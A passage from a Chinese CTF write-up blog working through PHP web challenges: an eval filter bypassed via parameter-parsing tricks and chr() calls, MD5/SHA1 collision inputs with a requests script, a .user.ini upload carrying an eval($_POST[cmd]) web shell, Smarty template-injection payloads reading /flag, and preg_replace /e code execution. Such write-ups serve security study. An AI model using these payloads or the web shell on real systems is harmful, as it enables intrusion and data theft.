class="javascript">    &#125;)</span><br><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>打开calc.php，发现PHP代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>首先发送一个phpinfo()测试，发现返送回来一个403，基本可以判定部署的WAF/IDS会对url里的参数进行检查，对于含有英文字符的直接屏蔽，只能发送数字和运算符号。</p><h3 id="php请求参数解析漏洞">PHP请求参数解析漏洞</h3><p>利用PHP的请求参数解析漏洞</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">http:<span class="hljs-comment">//node4.buuoj.cn:28838/calc.php?num=phpinfo()</span><br>http:<span class="hljs-comment">//node4.buuoj.cn:28838/calc.php? num=phpinfo()</span><br></code></pre></td></tr></table></figure><p>当发送这两个变量时，都会在PHP内部解析为“num”变量（PHP解析时自动忽略前置空格）</p><p>因此我们利用这招绕过了url上的字母检查，达到PHP内部实现RCE</p><p>同样的例子还有：</p><p>在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[出现后，后面的点就不会再被转义了。</p><p>such as：<code>CTF[SHOW.COM</code>=&gt;<code>CTF_SHOW.COM</code></p><p>ban了这么多东西不要紧，我们还是可以利用PHP的内部函数来绕过</p><p>（PHP的原生函数在RCE受限的情况下还是非常有用的，用起来也需要一定的熟练度和脑洞）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">num=var_dump(scandir(chr(<span class="hljs-number">47</span>)))<br>num=var_dump(readfile(chr(<span class="hljs-number">47</span>).chr(<span class="hljs-number">102</span>).chr(<span class="hljs-number">49</span>).chr(<span class="hljs-number">97</span>).chr(<span class="hljs-number">103</span>).chr(<span class="hljs-number">103</span>)))<br></code></pre></td></tr></table></figure><p>成功拿到flag。</p><h3 id="http请求走私">HTTP请求走私</h3><p>我们当然也可以尝试使用HTTP请求走私的方法去绕过url的检查。（主要利用HTTP的分块传输chunked知识点）</p><p>参考资料:</p><p>https://virusday.github.io/2020/11/27/http%E7%BC%96%E7%A0%81%E7%BB%95waf/%E7%BC%96%E7%A0%81%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93%E7%BB%95waf/</p><p>HTTP请求走私：</p><p>https://websec.readthedocs.io/zh/latest/vuln/httpSmuggling.html</p><p>https://xz.aliyun.com/t/6654#toc-1%5D</p><h2 id="ez_bypassmd5强碰撞">2、Ez_ByPass——MD5强碰撞</h2><p>这道题就是PHP特性题，当然MD5强碰撞还是第一次遇见，在这里记录一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>        <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (md5(<span class="hljs-variable">$id</span>) === md5(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>                <span class="hljs-keyword">if</span> (!is_numeric(<span class="hljs-variable">$passwd</span>))<br>                &#123;<br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br>                    &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">else</span><br>                    &#123;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>                &#125;<br><br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>            &#125;<br>    &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>主要的难点就在于MD5强碰撞，不过已经有现成的脚本（fastcoll_v1.0.0.5.exe 可以在GitHub上找到）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell">fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt<br></code></pre></td></tr></table></figure><p>这里附上现成的结果，下次可以直接撸</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">id=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%7Eb%12%F5%876u%1Fl%90%A9%96AH%C1%83%7B%B1%D27%DDfuA%10%C6y%CE-%FE%BE%9DH%E1%B3%ED%CE%9F%DB8%CB%E1%C3%12%BB%D3%19%18%27%E0%0D%DC%BDQ%95%EA%8F%1F%DDu%87%21J.%C9%C3%AF%5ER%CE%AD5I%8E%00%D9O%AF%E4%23%22u%F2%F6%17%B4%E0%1C%D5%F7%12%C9%CC0%7D%22%037%1F%FF%7D%2C%93%D6%8F%B4%A0%AFT%05S%C6%D8%609F%8B%7E%EB%F6%E3%1A%E0o%DB%A1%2C%A7<br><br>gg=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%7Eb%12%F5%876u%1Fl%90%A9%96AH%C1%83%7B%B1%D2%B7%DDfuA%10%C6y%CE-%FE%BE%9DH%E1%B3%ED%CE%9F%DB8%CB%E1%C3%12%BBS%1A%18%27%E0%0D%DC%BDQ%95%EA%8F%1F%DD%F5%87%21J.%C9%C3%AF%5ER%CE%AD5I%8E%00%D9O%AF%E4%23%22u%F2v%17%B4%E0%1C%D5%F7%12%C9%CC0%7D%22%037%1F%FF%7D%2C%93%D6%8F%B4%A0%AFT%85R%C6%D8%609F%8B%7E%EB%F6%E3%1A%E0%EF%DB%A1%2C%A<br></code></pre></td></tr></table></figure><p>这里再附一个Python代码，某次又碰到了，但还是没秒出，生气！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># md5</span><br><span class="hljs-comment"># array1 = r&quot;1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%9FNC%A6%B0%3Ca9%A6%D9%F52j%E5%07%F7%13%E1%ADn%3D%8A%B7%5D%D27%B6%EE+A4%B5%0D%BF%02%3A%0B%F0%F2K%1A9%C3%1E%96%B7%14%92%9B%88Oh%93%3E%EBb%3C%CB%9B%CB%029a%5D%7B%E1%CA%D2%99%0E%FBs%FD%DFW%A5%EAJ%0A%B8%7EUQ%FBe%16%26%D3Zv7%ECF%DE%E7%EE%25%1EX%F4%98%D8%12%CA.EO%B8%CCU%EEk%10%18%0Ej%9B%C1%C4%0BZ%10%05%3D%29%C1%5E&quot;</span><br><span class="hljs-comment"># array2 = r&quot;1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%AA%9FNC%A6%B0%3Ca9%A6%D9%F52j%E5%07%F7%13%E1-n%3D%8A%B7%5D%D27%B6%EE+A4%B5%0D%BF%02%3A%0B%F0%F2K%1A9%C3%1E%16%B8%14%92%9B%88Oh%93%3E%EBb%3C%CB%1B%CB%029a%5D%7B%E1%CA%D2%99%0E%FBs%FD%DFW%A5%EAJ%0A%B8%7EU%D1%FBe%16%26%D3Zv7%ECF%DE%E7%EE%25%1EX%F4%98%D8%12%CA.EO%B8LU%EEk%10%18%0Ej%9B%C1%C4%0BZ%10%85%3D%29%C1%5E&quot;</span><br><br><span class="hljs-comment"># sha1</span><br>array1 = <span class="hljs-string">r&quot;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&quot;</span><br>array2 = <span class="hljs-string">r&quot;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&quot;</span><br><br>url = <span class="hljs-string">&quot;http://1.14.71.254:28577/Level___3.php&quot;</span><br>url_1 = <span class="hljs-string">&quot;http://127.0.0.1&quot;</span><br><br>proxies = &#123;<br>    <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span>,<br>    <span class="hljs-string">&quot;https&quot;</span>:<span class="hljs-string">&quot;127.0.0.1:8080&quot;</span><br>&#125;<br><br>headers = &#123;<br>    <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>&#125;<br><br>cmd = <span class="hljs-string">&quot;array1=&quot;</span>+array1+<span class="hljs-string">&quot;&amp;array2=&quot;</span>+array2<br><br>r = requests.post(url=url,proxies=proxies,data=cmd,headers=headers)<br><br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>第二个绕过点就很简单了，直接利用PHP字符串隐式转数字的特点：<code>password = 1234567a</code>就可以过了。</p><h2 id="suctf-checkin.user.ini-文件上传">3、SUCTF-Checkin(.user.ini 文件上传)</h2><p>打开题目界面，发现这样的场景。</p><p>直接上传正常的文件，我们可以发现可以直接访问到一个upload的目录，在该目录下存在我们上传的文件和一个index.php。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_1.png" /></p><p>首先上传一个简单的测试，基本可以猜测后端会检查文件类型，上传PHP类型等直接解析的文件类型的成功概率不大（尝试一下如php3，phtml等常见绕过文件名）。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_2.png" /></p><p>试着改回jpg看看有没有办法，这回报错说检测到&lt;?的存在。<img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_4.png" /></p><p>绕过&lt;?，我们可以直接改成这样的html标签语句。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="javascript"><span class="hljs-built_in">eval</span>($_POST[cmd]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>把文件名改成jpg上传之后，发现返回了文件头检测的报错。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_3.png" /></p><p>填上GIF的文件头<code>GIF89a</code>尝试骗过去，这下传上去了，尝试进入对应目录的index.php，很遗憾，没有文件包含解析漏洞的环节。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_9.png" /></p><p>（补充：其实这里可以当成1.html，传上去，但是rce的时候会被405 Forbidden，其实感觉一个突破点）。</p><p>接下来就是查资料了，直接查到P牛关于.user.ini利用的漏洞。</p><p>php解析的时候，同文件夹的ini文件其实是能影响的。</p><p>接下来，利用auto_prepend_file和auto_append_file这两个设置，我们将.user.ini传上去，再利用文件包含漏洞，成功获得了后门的权限。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_6.png" /></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_7.png" /></p><p>参考wp:</p><p>https://xz.aliyun.com/t/6091</p><h2 id="hctf-admin">4、HCTF-admin</h2><h2 id="ciscn华东南-web11php-ssti">5、CISCN华东南-Web11（PHP SSTI）</h2><p>打开页面，是一个IP-API的使用说明</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0003/blog0003_11.png" /></p><p>可以注意到，这里在右上角获取到了我的IP地址，是一个跟后端交互的点，同时注意到这个网页使用的是smarty，基本可以考虑PHP的模板注入。</p><p>首先我们尝试获取相关信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&#123;<span class="hljs-variable">$smarty</span>.version&#125;<span class="hljs-comment">//获取版本信息</span><br></code></pre></td></tr></table></figure><p><img src="C:\Users\chendher\AppData\Roaming\Typora\typora-user-images\image-20220405202653660.png" alt="image-20220405202653660" /></p><p>得到了smarty的版本为3+，在3以上版本的smarty禁止了<code>&#123;php&#125;&#123;/php&#125;</code>标签。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&#123;php&#125;phpinfo();&#123;/php&#125;<br></code></pre></td></tr></table></figure><p>不过我们可以使用其他的标签（这里说起来感觉和XSS有点接近，毕竟都是涉及到Web画面渲染）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&#123;if phpinfo()&#125;&#123;/if&#125;<br>&#123;if readfile(&#x27;/flag&#x27;)&#125;&#123;/if&#125;<br></code></pre></td></tr></table></figure><p>这样我们就可以拿到我们想要的数据了。</p><p>漏洞的成因基本如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;./smarty/libs/&#x27;</span> . <span class="hljs-string">&#x27;Smarty.class.php&#x27;</span>);<br>    <span class="hljs-variable">$smarty</span> = <span class="hljs-keyword">new</span> Smarty();<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>    <span class="hljs-variable">$smarty</span>-&gt;display(<span class="hljs-string">&quot;string:&quot;</span>.<span class="hljs-variable">$ip</span>);     <br><span class="hljs-comment">// display函数把标签替换成对象的php变量；显示模板</span><br>&#125;<br></code></pre></td></tr></table></figure><p>SSTI的博客链接推荐：</p><p>https://www.cnblogs.com/bmjoker/p/13508538.html</p><h2 id="bjdctf-不过如此">6、BJDCTF-不过如此</h2><p>前面两个点其实非常简单，基本就是<code>php</code>伪协议文件流来读。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$text</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;text&quot;</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$text</span>)&amp;&amp;(file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>)===<span class="hljs-string">&quot;I have a dream&quot;</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="hljs-variable">$text</span>,<span class="hljs-string">&#x27;r&#x27;</span>).<span class="hljs-string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,<span class="hljs-variable">$file</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Not now!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);  <span class="hljs-comment">//next.php</span><br>    <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://710ac4b6-c046-4853-83bb-d8ea73eb9217.node4.buuoj.cn:81/?text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/convert.base64-encode/resource=next.php<br></code></pre></td></tr></table></figure><p>然后读取到文件，解码之后得到如下的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> preg_replace(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> complex(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就是<code>preg</code>任意代码执行的点了，<code>$re</code>和<code>$str</code>这里我们可以自由控制。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">?\S*=$&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>])&#125;<br><br><span class="hljs-comment">//构造出如下正则表达式（用phpinfo来简化一下）</span><br>preg_replace(<br>  <span class="hljs-string">&#x27;/(\S*)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$&#123;phpinfo()&#125;</span>&#125;&quot;</span><br>    );<br></code></pre></td></tr></table></figure><p>这里具体的匹配原则如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/*</span><br><span class="hljs-comment">正则表达式中的“\\1”实际上指的字符串的第一个匹配部分（放在缓冲区中）</span><br><span class="hljs-comment">&#123;$&#123;phpinfo()&#125;&#125; -&gt; &#123;$&#123;1&#125;&#125; -&gt; strtolower(&quot;\\1&quot;)  -&gt; strtolower(&quot;$&#123;1&#125;&quot;) -&gt; strtolower(null)</span><br><span class="hljs-comment">在这其中解析的过程，我们会先调用phpinfo(),返回1，于是得到$1</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>对于可变变量的理解，附上一个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;This is a&quot;</span>;<br>    <span class="hljs-variable">$hello</span> = <span class="hljs-string">&quot;a&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$$hello</span>; <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">output:</span><br><span class="hljs-comment">$&#123;$hello&#125; = $a = This is a</span><br><span class="hljs-comment">*/</span>  <br></code></pre></td></tr></table></figure><p>分享一个大佬的博客：</p><p>https://www.sqlsec.com/2020/07/preg_replace.html#toc-heading-11</p><h2 id="极客-rceme">7、2019极客-RCEME</h2><h2 id="n1book-ssrfphp-url解析漏洞">8、N1BOOK-SSRF（PHP url解析漏洞）</h2><h2 id="suctf-upload-labs2">9、SUCTF-upload 